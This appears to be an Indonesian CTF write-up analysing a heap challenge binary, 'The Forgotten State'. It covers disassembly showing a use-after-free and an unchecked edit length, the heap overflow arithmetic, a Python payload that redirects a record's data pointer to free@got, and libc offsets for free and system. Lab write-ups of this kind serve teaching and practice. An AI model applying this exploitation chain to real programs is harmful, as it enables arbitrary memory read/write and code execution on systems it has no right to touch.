# THE FORGOTTEN STATE — Analisis

[← Overview](42-the-forgotten-state.md) · [Index](index.md)

### 2.1 Layout global

```text
table[16]   @ 0x404080   (pointer record; TIDAK dikosongkan saat release)
active[16]  @ 0x404100   (0/1; dikosongkan saat release)
free@got    @ 0x404000
```

Record (malloc 0x20 → chunk 0x30):

```text
+0x00  char name[16]
+0x10  uint32 len
+0x14  uint32 flags
+0x18  char *data
```

### 2.2 `op_create()`

```asm
1526: mov DWORD PTR [rbp-0x20], -1
1534: ... cari slot kosong (table[i] == NULL)
157f: mov edi, 0x20
1584: call malloc                    # record
15b9: call memset(record, 0, 0x20)
15de: call read_line(record->name, 0x10)
15fb: call read_int(&size, 1, 0x400)
161c: call malloc(size)              # data
1628: mov [record+0x18], rax         # record->data = data
1682: call read_exact(data, size)
16be: mov [record+0x10], size        # record->len = size
16c9: mov DWORD PTR [record+0x14], 1 # flags = 1
16e8: mov [table+idx*8], record
1700: mov DWORD PTR [active+idx*4], 1
```

### 2.3 `op_release()` — dangling pointer

```asm
173a: op_release:
...
1780: mov eax, [active+idx*4]
178a: test eax, eax
178c: jne 40179f                  # sudah dilepas -> tolak double free
179f: mov rax, [table+idx*8]
17b7: mov rax, [rax+0x18]         # record->data
17be: call free                   # free(data)
17c3: mov rax, [table+idx*8]
17de: call free                   # free(record)
17e3: mov eax, [rbp-0xc]
17f7: mov DWORD PTR [active+idx*4], 0   # active = 0
; table[idx] TIDAK di-null-kan
```

Karena `table[idx]` tetap berisi pointer ke chunk yang sudah di-free, dan `op_view`/`op_edit`/`op_list` hanya melihat `table[idx]` (bukan `active[idx]`), pointer tersebut masih bisa dipakai. Ini adalah **use-after-free**.

### 2.4 `op_view()` — read memakai field record

```asm
1869: mov eax, [rbp-0x18]         # index
1876: lea rax, [table]
187d: mov rax, [rdx+rax]          # table[idx] (tanpa cek active)
1889: mov eax, [rax+0x10]         # rec->len
188f: cmp eax, 0x400
1896: jbe ...
1898: mov DWORD PTR [rbp-0x14], 0x400  # clamp
18cf: mov edx, [rbp-0x14]
18da: mov rax, [rec+0x18]         # rec->data
18e2: call write(1, rec->data, len)
```

Jika field `rec->len` dan `rec->data` bisa dikendalikan, `view` menjadi **arbitrary read** (dibatasi 0x400 byte).

### 2.5 `op_edit()` — ukuran tidak divalidasi terhadap alokasi

```asm
192a: lea rax, [rbp-0x1c]
193b: call parse_index
1955: lea rax, [table]
195c: mov rax, [rdx+rax]          # table[idx] (tanpa cek active)
1964: lea rax, [rbp-0x18]
197c: call read_int(&new_len, 1, 0x400)
1999: mov rdx, [rbp-0x18]         # new_len
19a4: mov rax, [rec+0x18]         # rec->data
19ae: call read_exact(rec->data, new_len)
19c8: mov edx, [rbp-0x18]
19d2: mov [rec+0x10], edx         # rec->len = new_len
```

Tidak ada perbandingan `new_len` dengan `malloc` asli. Jika `rec` dibuat dengan `size = 0x20` (chunk data 0x30), `edit` dengan `new_len = 0x50` menulis melewati chunk data ke chunk record berikutnya.

### 2.6 Aritmetika overflow

Urutan `create`:

```text
rec0: record A0 (chunk 0x30), data B0 (chunk 0x30)
rec1: record A1 (chunk 0x30), data B1 (chunk 0x30)
rec2: record A2, data B2 = "/bin/sh"
rec3: record A3, data B3
```

`edit(rec0, 0x50)` menulis dari user data `B0`:

```text
B0+0x00 .. B0+0x1f   data rec0 (32 byte)
B0+0x20 .. B0+0x27   A1->prev_size
B0+0x28 .. B0+0x2f   A1->size       -> 0x31
B0+0x30 .. B0+0x3f   A1->name[16]
B0+0x40 .. B0+0x43   A1->len        -> 8
B0+0x44 .. B0+0x47   A1->flags      -> 1
B0+0x48 .. B0+0x4f   A1->data       -> free@got
```

Payload 0x50 byte di script:

```python
ov  = b'A' * 0x28
ov += p64(0x31)          # rec1 chunk size
ov += b'X' * 0x10        # rec1 name
ov += p32(8) + p32(1)   # rec1 len, flags
ov += p64(FREE_GOT)      # rec1->data
assert len(ov) == 0x50
```

### 2.7 Alamat dan offset

| Item | Nilai |
|---|---|
| `free@got` | `0x404000` |
| `free` offset | `0xb5360` |
| `system` offset | `0x5c2e0` |

`release(rec3)` dipanggil lebih dulu untuk memastikan `free@got` sudah terselesaikan (tidak lagi menunjuk PLT stub) sebelum leak.
